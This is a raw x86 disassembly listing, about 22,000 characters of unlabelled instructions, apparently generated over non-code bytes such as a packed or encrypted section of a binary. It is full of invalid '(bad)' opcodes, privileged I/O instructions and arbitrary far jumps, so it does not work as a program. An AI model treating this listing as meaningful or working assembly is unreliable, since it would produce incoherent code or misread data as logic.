  41a4ed:	les    edx,FWORD PTR [edi-0x35]
  41a4f0:	or     edi,0x7e
  41a4f3:	fcmovu st,st(2)
  41a4f5:	fild   QWORD PTR [ebx-0x5a]
  41a4f8:	pop    ebp
  41a4f9:	clc    
  41a4fa:	imul   edi,DWORD PTR [ecx+ebp*2],0x80753dbd
  41a501:	xchg   DWORD PTR [edi],ebx
  41a503:	gs lahf 
  41a505:	mov    WORD PTR [edi],ss
  41a507:	xor    eax,0x75c175d0
  41a50c:	mov    bh,al
  41a50e:	pusha  
  41a50f:	js     0x41a559
  41a511:	pop    ebp
  41a512:	adc    bl,BYTE PTR [ecx+0x41]
  41a515:	div    BYTE PTR [ecx]
  41a517:	xor    BYTE PTR [esi+ebp*8],ch
  41a51a:	scas   al,BYTE PTR es:[edi]
  41a51b:	js     0x41a4db
  41a51d:	or     eax,0xc8b77fda
  41a522:	push   eax
  41a523:	aad    0xe
  41a525:	mov    edi,0xdd3f3465
  41a52a:	in     eax,dx
  41a52b:	(bad)  
  41a52d:	adc    ebx,DWORD PTR [edx-0x23866e08]
  41a533:	(bad)  
  41a534:	jnp    0x41a530
  41a536:	cmp    BYTE PTR ds:[eax-0x5f189754],ch
  41a53d:	sub    al,0xba
  41a53f:	dec    ebp
  41a540:	stos   BYTE PTR es:[edi],al
  41a541:	loop   0x41a51e
  41a543:	push   edi
  41a544:	test   BYTE PTR [esi],ah
  41a546:	inc    ebx
  41a547:	jp     0x41a5a1
  41a549:	pushf  
  41a54a:	mov    esi,0x2d8a4a38
  41a54f:	fstp   DWORD PTR [edx+0x69]
  41a552:	sbb    BYTE PTR [esi+0x5e85b5],bh
  41a558:	mov    dh,0xf8
  41a55a:	push   ebp
  41a55b:	das    
  41a55c:	pop    esi
  41a55d:	jg     0x41a4ed
  41a55f:	xchg   bx,ax
  41a561:	les    edx,FWORD PTR [eax+ebx*8+0x6edc149e]
  41a568:	pop    esp
  41a569:	push   0xffffffb4
  41a56b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a56c:	jl     0x41a5cb
  41a56e:	dec    ebx
  41a56f:	shl    DWORD PTR [eax+0x75],1
  41a572:	jnp    0x41a569
  41a574:	mov    ecx,0x12559d47
  41a579:	shl    BYTE PTR [ebx-0x6c],1
  41a57c:	ds jne 0x41a51e
  41a57f:	ins    BYTE PTR es:[edi],dx
  41a580:	cmc    
  41a581:	ficom  DWORD PTR [edi-0x78d9d812]
  41a587:	ins    BYTE PTR es:[edi],dx
  41a588:	cmp    eax,0x48d67a24
  41a58d:	loope  0x41a51d
  41a58f:	mov    dh,0x95
  41a591:	rcl    BYTE PTR [eax+0x57],0xfc
  41a595:	les    ecx,FWORD PTR [eax-0x1bb3b25f]
  41a59b:	adc    DWORD PTR [esi+0x61e2a114],eax
  41a5a1:	aad    0x4a
  41a5a3:	mov    dh,0x5a
  41a5a5:	in     eax,0xe0
  41a5a7:	mov    ?,WORD PTR [ebx]
  41a5a9:	push   es
  41a5aa:	sub    eax,0x8c9a7d23
  41a5af:	and    al,0xea
  41a5b1:	loopne 0x41a5df
  41a5b3:	popf   
  41a5b4:	push   edx
  41a5b5:	push   ebp
  41a5b6:	push   0x340cc9df
  41a5bb:	in     eax,0x26
  41a5bd:	ret    
  41a5be:	hlt    
  41a5bf:	inc    ecx
  41a5c0:	dec    ebx
  41a5c1:	sbb    DWORD PTR [ebp+0x75],0xffffffbf
  41a5c5:	inc    eax
  41a5c6:	mov    esp,0x39a266f5
  41a5cb:	mov    dl,0xab
  41a5cd:	xchg   esp,eax
  41a5ce:	mov    al,ds:0x9b583beb
  41a5d3:	dec    ebx
  41a5d4:	sub    bh,bl
  41a5d6:	cdq    
  41a5d7:	mov    ds:0x636be89f,al
  41a5dc:	aaa    
  41a5dd:	mov    cl,BYTE PTR [esi+0x59adc6]
  41a5e3:	gs pop ds
  41a5e5:	and    DWORD PTR [ecx-0x22],ebp
  41a5e8:	mov    esi,0xfab276a7
  41a5ed:	cdq    
  41a5ee:	add    eax,0xd69b934a
  41a5f3:	or     ebx,DWORD PTR [eax+0x37d9e058]
  41a5f9:	cs push eax
  41a5fb:	or     edx,DWORD PTR [edi-0x1ad83026]
  41a601:	push   esp
  41a602:	pusha  
  41a603:	retf   0x3148
  41a606:	cmp    bl,bl
  41a608:	add    BYTE PTR [eax+0x69],bh
  41a60b:	and    BYTE PTR [edi-0x16],cl
  41a60e:	mov    edx,ecx
  41a610:	bound  ebx,QWORD PTR [ebx]
  41a612:	in     al,dx
  41a613:	mov    ebx,0xbfdf2d98
  41a618:	fwait
  41a619:	mov    esi,0x1cf53081
  41a61e:	ds fwait
  41a620:	and    DWORD PTR [esi-0x44e08704],0x23
  41a627:	in     eax,0x79
  41a629:	mov    eax,ds:0x7f39eaf2
  41a62e:	test   al,0xb7
  41a630:	add    edx,DWORD PTR [ebp+0x58aa3aa7]
  41a636:	into   
  41a637:	loope  0x41a656
  41a639:	int    0x9d
  41a63b:	imul   edi,edx,0xffffffcf
  41a63e:	push   cs
  41a63f:	sti    
  41a640:	jp     0x41a65b
  41a642:	and    esi,DWORD PTR [edx]
  41a644:	add    edi,DWORD PTR [edi+0x37d6502f]
  41a64a:	add    bl,ah
  41a64c:	out    0xf2,al
  41a64e:	jne    0x41a6cd
  41a650:	ins    BYTE PTR es:[edi],dx
  41a651:	fisubr DWORD PTR ds:0xf8772733
  41a657:	jmp    0x6d13:0xa78ec6dd
  41a65e:	fst    st(1)
  41a660:	cmp    BYTE PTR [ecx+0x23],0xc6
  41a664:	in     al,0x56
  41a666:	mov    ds:0xfedf29a0,al
  41a66b:	sub    ch,cl
  41a66d:	push   ecx
  41a66e:	mov    al,0x27
  41a670:	jp     0x41a65c
  41a672:	mov    ecx,0xaaef256a
  41a677:	outs   dx,DWORD PTR ds:[esi]
  41a678:	jbe    0x41a60d
  41a67a:	pop    ds
  41a67b:	jmp    0x22dd:0x6b8963aa
  41a682:	or     eax,0xf498ab96
  41a687:	dec    edi
  41a688:	cmp    al,0x85
  41a68a:	inc    esp
  41a68b:	gs dec eax
  41a68d:	xchg   DWORD PTR [edi],ebp
  41a68f:	push   ebx
  41a690:	pop    eax
  41a691:	iret   
  41a692:	dec    esi
  41a693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a694:	jmp    0x41a661
  41a696:	lea    esp,[eax]
  41a698:	cld    
  41a699:	add    bl,dh
  41a69b:	outs   dx,DWORD PTR ds:[esi]
  41a69c:	outs   dx,BYTE PTR ds:[esi]
  41a69d:	int3   
  41a69e:	jno    0x41a65f
  41a6a0:	inc    edi
  41a6a1:	mov    BYTE PTR [esi+ebp*2+0x231361ca],cl
  41a6a8:	mov    esi,0xb12b4365
  41a6ad:	shl    BYTE PTR [ebp-0x68],cl
  41a6b0:	js     0x41a6d1
  41a6b2:	and    ebx,DWORD PTR [eax-0x1e0cc391]
  41a6b8:	pop    es
  41a6b9:	or     DWORD PTR [eax+0x48],ebx
  41a6bc:	(bad)  
  41a6bd:	sar    esp,cl
  41a6bf:	add    dl,BYTE PTR [ecx+0x3e]
  41a6c2:	loop   0x41a705
  41a6c4:	sbb    DWORD PTR [ebx-0x318acd5a],ebx
  41a6ca:	pop    edx
  41a6cb:	push   ss
  41a6cc:	leave  
  41a6cd:	fcomip st,st(4)
  41a6cf:	mov    ebp,0x9550dd46
  41a6d4:	ins    DWORD PTR es:[edi],dx
  41a6d5:	(bad)  
  41a6d6:	ret    0x1054
  41a6d9:	push   ebx
  41a6da:	pop    edi
  41a6db:	push   0x2e
  41a6dd:	pop    ebx
  41a6de:	outs   dx,DWORD PTR ds:[esi]
  41a6df:	clc    
  41a6e0:	mov    eax,ds:0xc333b93
  41a6e5:	jmp    0x41a74c
  41a6e7:	fstp   DWORD PTR [edx+0x70cdd133]
  41a6ed:	xchg   di,ax
  41a6ef:	(bad)  
  41a6f0:	fnstcw WORD PTR ds:[edx-0x35]
  41a6f4:	loopne 0x41a6ab
  41a6f6:	aam    0xd4
  41a6f8:	mov    DWORD PTR [edx-0x2],edi
  41a6fb:	sbb    ebx,edx
  41a6fd:	ret    
  41a6fe:	rcl    BYTE PTR [ebp+eiz*8-0x12af10dc],cl
  41a705:	mov    ebp,0xe64b9821
  41a70a:	sti    
  41a70b:	mov    ds:0x1f353938,eax
  41a710:	retf   0xa1f9
  41a713:	dec    esi
  41a714:	or     BYTE PTR [edx+0x63],dh
  41a717:	ds out 0xf9,al
  41a71a:	inc    ecx
  41a71b:	push   es
  41a71c:	adc    dh,ch
  41a71e:	(bad)  [esi+0x2e]
  41a721:	xlat   BYTE PTR ds:[ebx]
  41a722:	and    esp,edx
  41a724:	pop    DWORD PTR [esi+edx*4+0x527dc9a2]
  41a72b:	xchg   edx,eax
  41a72c:	jmp    0x41a6f6
  41a72e:	jns    0x41a73c
  41a730:	loop   0x41a72c
  41a732:	push   ebx
  41a733:	rcr    DWORD PTR [edx+0x4b],0xdb
  41a737:	and    DWORD PTR [ecx+0xe],eax
  41a73a:	xchg   BYTE PTR [eax+esi*8],dh
  41a73d:	pop    edi
  41a73e:	sbb    edx,DWORD PTR [ebp+0xaa634d8]
  41a744:	retf   
  41a745:	push   esp
  41a746:	cdq    
  41a747:	mov    ah,0x1a
  41a749:	add    eax,0x8f85e05a
  41a74e:	lods   al,BYTE PTR ds:[esi]
  41a74f:	lds    ebx,FWORD PTR [edi]
  41a751:	add    cl,BYTE PTR [esi]
  41a753:	mov    dl,0x64
  41a755:	inc    esp
  41a756:	mov    cl,0x68
  41a758:	addr16 test al,0x85
  41a75b:	xor    DWORD PTR [esi+eiz*4+0x68f07bdd],esi
  41a762:	and    DWORD PTR [ecx],0x6f
  41a765:	adc    BYTE PTR [ebx+0x51],bl
  41a768:	loopne 0x41a788
  41a76a:	mov    ecx,0xa8d4fb01
  41a76f:	idiv   DWORD PTR [esi+0x78894b89]
  41a775:	sbb    eax,0x257aa4a8
  41a77a:	mov    dh,0x83
  41a77c:	js     0x41a793
  41a77e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a780:	sti    
  41a781:	sbb    DWORD PTR fs:[edx],0xbc18e91c
  41a788:	js     0x41a791
  41a78a:	fcomp  QWORD PTR [esi]
  41a78c:	rep ins DWORD PTR es:[edi],dx
  41a78e:	sub    DWORD PTR [ebp-0x51],ecx
  41a791:	sbb    DWORD PTR [edx-0x17],ebx
  41a794:	daa    
  41a795:	sub    DWORD PTR [ebp-0x6b],ebx
  41a798:	je     0x41a7e1
  41a79a:	sub    BYTE PTR [ecx],cl
  41a79c:	mov    es,ebx
  41a79e:	pop    eax
  41a79f:	xor    dl,BYTE PTR [edi+0x26479885]
  41a7a5:	inc    esi
  41a7a6:	aam    0x93
  41a7a8:	push   edi
  41a7a9:	mov    dl,0x52
  41a7ab:	repz cld 
  41a7ad:	test   bl,dh
  41a7af:	add    ebp,esp
  41a7b1:	dec    esp
  41a7b2:	es int 0x63
  41a7b5:	es int3 
  41a7b7:	or     BYTE PTR [edi+0x68],bh
  41a7ba:	jmp    0x9453:0x195f2ed1
  41a7c1:	or     al,0x27
  41a7c3:	push   edx
  41a7c4:	js     0x41a82a
  41a7c6:	in     al,dx
  41a7c7:	pop    ebp
  41a7c8:	call   0xc9f41c7c
  41a7cd:	and    cl,BYTE PTR [ebx]
  41a7cf:	pop    ecx
  41a7d0:	(bad)  
  41a7d2:	stc    
  41a7d3:	pusha  
  41a7d4:	pop    ecx
  41a7d5:	sbb    bl,cl
  41a7d7:	(bad)  
  41a7d9:	inc    ebx
  41a7da:	adc    al,0xb2
  41a7dc:	push   esi
  41a7dd:	iret   
  41a7de:	sub    eax,0x584bb107
  41a7e3:	iret   
  41a7e4:	xor    BYTE PTR [ecx],ah
  41a7e6:	call   0x28d6c3a8
  41a7eb:	push   ebx
  41a7ec:	cmp    BYTE PTR [ebx-0x39],0xf1
  41a7f0:	fcom   DWORD PTR [edx]
  41a7f2:	push   eax
  41a7f3:	mov    eax,ds:0xf7e529a9
  41a7f8:	jge    0x41a812
  41a7fa:	push   es
  41a7fb:	xchg   BYTE PTR [ebp-0x75bf4023],bh
  41a801:	shr    DWORD PTR [edx+0x470bb2b2],1
  41a807:	or     BYTE PTR [edx+0x74],al
  41a80a:	dec    eax
  41a80b:	fnstsw WORD PTR [ebp-0x7ca24bde]
  41a811:	sbb    BYTE PTR [ecx],dl
  41a813:	xchg   edi,eax
  41a814:	push   esp
  41a815:	sbb    al,0xe5
  41a817:	sti    
  41a818:	cmp    DWORD PTR [ebp+0x25],esp
  41a81b:	jecxz  0x41a87e
  41a81d:	repz jns 0x41a7ef
  41a820:	clc    
  41a821:	retf   
  41a822:	xor    al,0x61
  41a824:	les    eax,FWORD PTR [ebp+0x61744c32]
  41a82a:	add    bl,BYTE PTR [ecx]
  41a82c:	push   cs
  41a82d:	add    BYTE PTR [ecx+0x26],0x37
  41a831:	sti    
  41a832:	lahf   
  41a833:	or     ch,dl
  41a835:	das    
  41a836:	sub    ah,bh
  41a838:	push   0x1bdfe268
  41a83d:	mov    DWORD PTR [ebx-0x28],edx
  41a840:	cmp    DWORD PTR [ebx-0x80],0xffffff8e
  41a844:	dec    edx
  41a845:	call   0x71a9cd4f
  41a84a:	or     al,0xd0
  41a84c:	(bad)  
  41a84d:	sbb    ebx,edx
  41a84f:	pop    edx
  41a850:	mov    al,0x1c
  41a852:	adc    al,0xb5
  41a854:	adc    esi,DWORD PTR [ebp+esi*8+0x3b]
  41a858:	adc    al,0xe3
  41a85a:	dec    esi
  41a85b:	shr    BYTE PTR [edi],1
  41a85d:	das    
  41a85e:	or     al,BYTE PTR [esi-0x20]
  41a861:	sbb    al,0x2b
  41a863:	popf   
  41a864:	lea    eax,[ebp+0x48acfea]
  41a86a:	inc    edx
  41a86b:	mov    esp,0xd0290593
  41a870:	push   eax
  41a871:	pusha  
  41a872:	add    eax,0xd0203ba5
  41a877:	ins    DWORD PTR es:[edi],dx
  41a878:	gs xchg ecx,eax
  41a87a:	fdivr  st,st(1)
  41a87c:	dec    ecx
  41a87d:	adc    eax,0x774df9c0
  41a882:	fwait
  41a883:	mov    bl,0x6b
  41a885:	sub    BYTE PTR [edi-0x6f],cl
  41a888:	sahf   
  41a889:	and    eax,0xf70befd5
  41a88e:	adc    BYTE PTR [ecx-0x1c],bl
  41a891:	sub    bh,BYTE PTR [edx]
  41a893:	ja     0x41a8c9
  41a895:	imul   edx,DWORD PTR [esi+ebx*4+0x4e],0xd6d31ad9
  41a89d:	mov    ebp,0xc0bb4525
  41a8a2:	or     BYTE PTR [eax+0x28],bh
  41a8a5:	push   edi
  41a8a6:	leave  
  41a8a7:	jae    0x41a85c
  41a8a9:	icebp  
  41a8aa:	ret    0xec23
  41a8ad:	ret    0x4d2e
  41a8b0:	into   
  41a8b1:	fild   WORD PTR [ebx]
  41a8b3:	xchg   esp,eax
  41a8b4:	jnp    0x41a867
  41a8b6:	jecxz  0x41a8b0
  41a8b8:	ret    
  41a8b9:	inc    esp
  41a8ba:	in     al,0x8b
  41a8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8bd:	mov    ebp,0x45153769
  41a8c2:	out    0x9c,al
  41a8c4:	lock inc edi
  41a8c6:	pop    ss
  41a8c7:	mov    al,0xa8
  41a8c9:	xchg   ebp,edi
  41a8cb:	popf   
  41a8cc:	cmp    ecx,DWORD PTR [esi+0x30]
  41a8cf:	dec    ecx
  41a8d0:	dec    esi
  41a8d1:	xor    bh,cl
  41a8d3:	(bad)  
  41a8d4:	cmp    al,0x94
  41a8d6:	call   FWORD PTR [edi+0x3d]
  41a8d9:	addr16 inc ecx
  41a8db:	fsub   DWORD PTR [edx+0x3301a7ca]
  41a8e1:	jp     0x41a8c4
  41a8e3:	lods   eax,DWORD PTR ds:[esi]
  41a8e4:	mov    dh,0xe1
  41a8e6:	sahf   
  41a8e7:	push   0x3
  41a8e9:	clc    
  41a8ea:	xor    eax,0x8f7c53e2
  41a8ef:	and    al,0xb0
  41a8f1:	sbb    DWORD PTR [ebp-0xc],esi
  41a8f4:	clc    
  41a8f5:	dec    ebp
  41a8f6:	add    DWORD PTR [ecx-0x27],esi
  41a8f9:	push   cs
  41a8fa:	lahf   
  41a8fb:	rcr    dh,1
  41a8fd:	adc    DWORD PTR [ecx-0x31],eax
  41a900:	mov    ch,0x16
  41a902:	(bad)  
  41a903:	cmp    BYTE PTR [ecx],al
  41a905:	push   eax
  41a906:	repnz out 0x50,eax
  41a909:	das    
  41a90a:	in     al,dx
  41a90b:	data16 fcomi st,st(1)
  41a90e:	cwde   
  41a90f:	(bad)  
  41a910:	arpl   WORD PTR [edi-0x2cef9da9],cx
  41a916:	dec    edx
  41a917:	mov    ?,esp
  41a919:	fdiv   st,st(6)
  41a91b:	jl     0x41a8ee
  41a91d:	xor    al,0x77
  41a91f:	outs   dx,DWORD PTR ds:[esi]
  41a920:	mov    edx,DWORD PTR [edi-0x345ec9b5]
  41a926:	xor    DWORD PTR [eax+0x4cb0933],edx
  41a92c:	test   al,0x55
  41a92e:	clts   
  41a930:	push   0xffffff80
  41a932:	mov    eax,0x7e1ff1fd
  41a937:	mov    ch,0xc1
  41a939:	ror    DWORD PTR [edi+0x5c03b38f],0x60
  41a940:	rcl    BYTE PTR ds:0x12773ba0,0xd4
  41a947:	add    ebp,0xffffffd4
  41a94a:	sub    BYTE PTR [ecx+ecx*1],ah
  41a94d:	ror    BYTE PTR [esi+ebp*1],0xe7
  41a951:	mov    eax,ds:0x46dd16b5
  41a956:	mov    al,0xd0
  41a958:	push   edx
  41a959:	pop    ecx
  41a95a:	sbb    BYTE PTR [edx],bh
  41a95c:	leave  
  41a95d:	or     BYTE PTR ds:0xc8761414,al
  41a963:	aad    0x36
  41a965:	inc    eax
  41a966:	xor    BYTE PTR [ebp-0xe],dh
  41a969:	cmp    al,0x5d
  41a96b:	fldenv [ecx]
  41a96d:	pusha  
  41a96e:	rcl    cl,1
  41a970:	inc    edi
  41a971:	sbb    al,BYTE PTR [esp+eiz*2+0x21]
  41a975:	fistp  QWORD PTR [eax-0x648543e7]
  41a97b:	(bad)  
  41a97c:	pop    ebp
  41a97d:	inc    edi
  41a97e:	cmp    eax,0x2d7121a2
  41a983:	outs   dx,BYTE PTR ds:[esi]
  41a984:	call   0xf68b:0xa41905af
  41a98b:	push   ebp
  41a98c:	mov    cl,0x5b
  41a98e:	adc    eax,0x3ffd64f
  41a993:	xchg   ecx,eax
  41a994:	sub    DWORD PTR [ecx+0xad62f41],0xc08be538
  41a99e:	xchg   ebp,eax
  41a99f:	pushf  
  41a9a0:	push   ds
  41a9a1:	aaa    
  41a9a2:	xchg   ebx,eax
  41a9a3:	lods   eax,DWORD PTR ds:[esi]
  41a9a4:	ret    
  41a9a5:	icebp  
  41a9a6:	pop    ds
  41a9a7:	imul   edi,DWORD PTR [ecx+0x5c94bed5],0x9f61c401
  41a9b1:	xchg   ebp,eax
  41a9b2:	rol    DWORD PTR [ebp-0x4dec50b5],1
  41a9b8:	jg     0x41a9ea
  41a9ba:	push   cs
  41a9bb:	nop
  41a9bc:	shufps xmm4,XMMWORD PTR [eax+0x37d9c7e7],0x5f
  41a9c4:	pop    esp
  41a9c5:	imul   DWORD PTR [ebp-0x6e]
  41a9c8:	sbb    BYTE PTR [ecx],0x15
  41a9cb:	add    al,BYTE PTR [edx+edi*1+0x101f9485]
  41a9d2:	mov    ah,0x1c
  41a9d4:	fldenv [ebp+0x1f]
  41a9d7:	pushf  
  41a9d8:	lds    esi,FWORD PTR ds:0xad5d738c
  41a9de:	in     al,0x6f
  41a9e0:	lahf   
  41a9e1:	out    dx,eax
  41a9e2:	and    DWORD PTR [edx+eiz*4+0x65],0xdcf90f96
  41a9ea:	repnz push es
  41a9ec:	ins    BYTE PTR es:[edi],dx
  41a9ed:	aam    0x47
  41a9ef:	add    BYTE PTR [edx-0x3c943045],dh
  41a9f5:	sbb    ebp,DWORD PTR [ebp-0x151db53a]
  41a9fb:	and    cl,BYTE PTR [edi]
  41a9fd:	mov    ss,esi
  41a9ff:	fcmovnbe st,st(6)
  41aa01:	inc    ebx
  41aa02:	xor    eax,0x65ecc2d3
  41aa07:	scas   al,BYTE PTR es:[edi]
  41aa08:	dec    esp
  41aa09:	sbb    eax,0x83ffae5b
  41aa0e:	inc    eax
  41aa0f:	xchg   ebp,eax
  41aa10:	ins    DWORD PTR es:[edi],dx
  41aa11:	loope  0x41aa03
  41aa13:	mov    ds:0x3ae4fabe,al
  41aa18:	xor    al,0x54
  41aa1a:	pop    eax
  41aa1b:	sbb    eax,0xfbf92672
  41aa20:	fs or  eax,0x8f6182c
  41aa26:	xchg   edx,eax
  41aa27:	mov    ch,0x9b
  41aa29:	lods   eax,DWORD PTR ds:[esi]
  41aa2a:	test   BYTE PTR [ebx],dh
  41aa2c:	xor    edx,DWORD PTR [ebx+eiz*8]
  41aa2f:	or     bl,BYTE PTR [esp+ebp*8+0x62f27484]
  41aa36:	xchg   edx,eax
  41aa37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa38:	push   eax
  41aa39:	fs call 0xe196:0x25e48021
  41aa41:	dec    ebp
  41aa42:	pop    eax
  41aa43:	loope  0x41aa82
  41aa45:	shl    DWORD PTR [edx+0x5a],cl
  41aa48:	arpl   WORD PTR [ebx+0x2cf5a67c],cx
  41aa4e:	das    
  41aa4f:	hlt    
  41aa50:	or     DWORD PTR [ecx],0xffffffaa
  41aa53:	(bad)  
  41aa54:	out    0x3a,al
  41aa56:	loop   0x41aa3a
  41aa58:	jecxz  0x41a9e8
  41aa5a:	div    BYTE PTR [eax-0x7f5ded8]
  41aa60:	mov    ebp,0x165417c2
  41aa65:	mov    ebx,0x82872492
  41aa6a:	(bad)  
  41aa6b:	xor    ecx,DWORD PTR [edx+eax*8+0x6e9fd443]
  41aa72:	gs dec ebp
  41aa74:	sti    
  41aa75:	adc    BYTE PTR [esi-0x6722b12e],bh
  41aa7b:	xchg   DWORD PTR [esi],edi
  41aa7d:	inc    eax
  41aa7e:	mov    edx,0x3e8f5c25
  41aa83:	clc    
  41aa84:	jns    0x41aa26
  41aa86:	in     al,dx
  41aa87:	adc    BYTE PTR [edi],ah
  41aa89:	or     BYTE PTR [esi],0x35
  41aa8c:	in     al,dx
  41aa8d:	sub    edx,0xffffffec
  41aa90:	mov    edx,0x73363f9c
  41aa95:	push   esi
  41aa96:	test   DWORD PTR [ecx],esi
  41aa98:	inc    ebp
  41aa99:	fcom   QWORD PTR [eax-0x73de8bb6]
  41aa9f:	cmc    
  41aaa0:	popf   
  41aaa1:	push   esi
  41aaa2:	hlt    
  41aaa3:	xor    esp,esp
  41aaa5:	iret   
  41aaa6:	pop    ebx
  41aaa7:	(bad)  
  41aaa8:	lds    ebx,FWORD PTR [ecx]
  41aaaa:	xor    cl,BYTE PTR [edx-0x3f9c4332]
  41aab0:	dec    edx
  41aab1:	dec    esp
  41aab2:	adc    ebx,DWORD PTR [ecx]
  41aab4:	mov    ebp,0x370912b2
  41aab9:	das    
  41aaba:	mov    ebp,ss
  41aabc:	xlat   BYTE PTR ds:[ebx]
  41aabd:	adc    al,0x78
  41aabf:	mov    edi,0x3a0750cc
  41aac4:	imul   eax,edi,0xac5fb9e4
  41aaca:	loopne 0x41aa4e
  41aacc:	inc    BYTE PTR fs:[esi+ecx*2-0x74]
  41aad1:	or     DWORD PTR [eax+0x27c41418],esi
  41aad7:	call   0x24534a44
  41aadc:	ja     0x41aa5e
  41aade:	inc    edi
  41aadf:	ins    DWORD PTR es:[edi],dx
  41aae0:	adc    ebp,edx
  41aae2:	(bad)  
  41aae3:	push   eax
  41aae4:	xchg   edi,eax
  41aae5:	lock push ebp
  41aae7:	jno    0x41aaf9
  41aae9:	fiadd  WORD PTR [esi-0x7857606f]
  41aaef:	sbb    eax,0xb50639b0
  41aaf4:	sub    ah,BYTE PTR [edi+0x6c0ad3c8]
  41aafa:	fwait
  41aafb:	jmp    0x15cb:0xe201c1fd
  41ab02:	adc    BYTE PTR [edi+0x38],dl
  41ab05:	sub    eax,0x4e3a8420
  41ab0a:	inc    ebp
  41ab0b:	xor    esp,esi
  41ab0d:	adc    al,0x8a
  41ab0f:	push   ds
  41ab10:	push   0xffffffde
  41ab12:	sahf   
  41ab13:	inc    esp
  41ab14:	jmp    0x370ddae3
  41ab19:	into   
  41ab1a:	push   ebp
  41ab1b:	push   eax
  41ab1c:	stos   BYTE PTR es:[edi],al
  41ab1d:	repnz inc esi
  41ab1f:	inc    esi
  41ab20:	icebp  
  41ab21:	out    0x99,eax
  41ab23:	mov    eax,0x29262182
  41ab28:	int    0xed
  41ab2a:	imul   edi,DWORD PTR [esp+edx*8],0xce0c9cde
  41ab31:	or     BYTE PTR cs:[eax+0x62],bh
  41ab35:	retf   
  41ab36:	ss sub al,dh
  41ab39:	shl    BYTE PTR [ebp-0x2b013c20],0x72
  41ab40:	push   esi
  41ab41:	mov    al,bh
  41ab43:	es loopne 0x41ab5e
  41ab46:	dec    ebp
  41ab47:	fmul   st,st(2)
  41ab49:	jmp    FWORD PTR [ebx+0x5dba436a]
  41ab4f:	push   ecx
  41ab50:	imul   ecx,DWORD PTR [ebx+edx*4-0x25],0xcc8c3f
  41ab58:	cwde   
  41ab59:	loope  0x41ab52
  41ab5b:	fst    DWORD PTR [eax+0x4e]
  41ab5e:	and    BYTE PTR [eax],dh
  41ab60:	std    
  41ab61:	adc    ecx,DWORD PTR ds:0x13cb4d2c
  41ab67:	retf   0x58bf
  41ab6a:	fs mov bh,0xab
  41ab6d:	xchg   BYTE PTR [edi+ecx*1],al
  41ab70:	pop    ecx
  41ab71:	pop    edx
  41ab73:	jo     0x41ab60
  41ab75:	rol    BYTE PTR [eax+0x93c0590],0xc1
  41ab7c:	test   al,0x21
  41ab7e:	fld    QWORD PTR [edi]
  41ab80:	sub    cl,bl
  41ab82:	ror    DWORD PTR [eax+edi*8-0x2d],cl
  41ab86:	inc    esi
  41ab87:	(bad)  
  41ab88:	adc    al,0x20
  41ab8a:	xor    eax,ebx
  41ab8c:	inc    ebx
  41ab8d:	(bad)  
  41ab8e:	fucomip st,st(3)
  41ab90:	gs jns 0x41abed
  41ab93:	mov    dl,0xc1
  41ab95:	neg    DWORD PTR [esi-0x46]
  41ab98:	mov    dl,0x0
  41ab9a:	fld    TBYTE PTR [esi+0x15de038a]
  41aba0:	out    0x4a,al
  41aba2:	push   ebp
  41aba3:	cld    
  41aba4:	repnz add bh,BYTE PTR [edx-0x4bf0e288]
  41abab:	rcl    cl,1
  41abad:	popa   
  41abae:	test   al,0xd7
  41abb0:	xor    BYTE PTR [esi],0x31
  41abb3:	dec    eax
  41abb4:	(bad)  
  41abb5:	xchg   edi,eax
  41abb6:	lahf   
  41abb7:	inc    ebp
  41abb8:	pop    ss
  41abb9:	retf   
  41abba:	pop    edx
  41abbb:	dec    eax
  41abbc:	add    BYTE PTR [esp+eax*1-0x66],ah
  41abc0:	xor    DWORD PTR [eax],ebx
  41abc2:	mov    bl,0x3e
  41abc4:	inc    esp
  41abc5:	lock pop DWORD PTR [ebx-0x53]
  41abc9:	dec    edi
  41abca:	mov    eax,0xa13252b7
  41abcf:	jo     0x41ab73
  41abd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd2:	cmp    eax,0x8501cf6
  41abd7:	popa   
  41abd8:	test   eax,0xbcfab5c5
  41abdd:	or     al,0xe3
  41abdf:	sbb    al,bl
  41abe1:	xchg   edi,eax
  41abe2:	jle    0x41abc7
  41abe4:	jmp    0xea3e613d
  41abe9:	aaa    
  41abea:	inc    edx
  41abeb:	mov    esp,0xfa77def2
  41abf0:	adc    ebx,DWORD PTR ds:[edi]
  41abf3:	mov    bl,cl
  41abf5:	dec    DWORD PTR [ebp-0x6a]
  41abf8:	inc    edi
  41abf9:	fsubr  DWORD PTR [esi+ecx*2+0x5076712a]
  41ac00:	cmc    
  41ac01:	xchg   edi,eax
  41ac02:	push   edx
  41ac03:	loope  0x41ac34
  41ac05:	and    ah,bl
  41ac07:	rcr    BYTE PTR [edx-0x78],1
  41ac0a:	popa   
  41ac0b:	out    0xcd,eax
  41ac0d:	retf   
  41ac0e:	mov    al,0x97
  41ac10:	or     eax,ecx
  41ac12:	and    BYTE PTR [esi],cl
  41ac14:	adc    ah,BYTE PTR [ebx-0x12]
  41ac17:	les    esp,FWORD PTR [edx+ecx*8]
  41ac1a:	adc    DWORD PTR [ebx],ecx
  41ac1c:	bound  edi,QWORD PTR [eax-0x6ca592eb]
  41ac22:	jmp    0xf4424ff6
  41ac27:	cld    
  41ac28:	xlat   BYTE PTR ds:[ebx]
  41ac29:	std    
  41ac2a:	sub    al,0x9a
  41ac2c:	scas   eax,DWORD PTR es:[edi]
  41ac2d:	or     eax,0xe0188300
  41ac32:	mov    ds:0x64705484,eax
  41ac37:	aas    
  41ac38:	pop    es
  41ac39:	mov    WORD PTR [edx+0x19bf253e],fs
  41ac3f:	daa    
  41ac40:	and    ecx,DWORD PTR [ecx]
  41ac42:	lss    esp,FWORD PTR [ebx-0x3b589dd6]
  41ac49:	xor    ah,ah
  41ac4b:	cmp    dl,BYTE PTR [eax+eiz*2-0x19]
  41ac4f:	pushf  
  41ac50:	das    
  41ac51:	ss jb  0x41ac2b
  41ac54:	sub    DWORD PTR [ebx],edi
  41ac56:	repz mov ds:0x1ec2c403,al
  41ac5c:	sub    eax,0x1b797587
  41ac61:	cmp    DWORD PTR [ecx+eiz*1-0x17],edi
  41ac65:	push   edx
  41ac66:	inc    eax
  41ac67:	lods   al,BYTE PTR ds:[esi]
  41ac68:	jge    0x41acc6
  41ac6a:	loop   0x41acb5
  41ac6c:	add    esi,esp
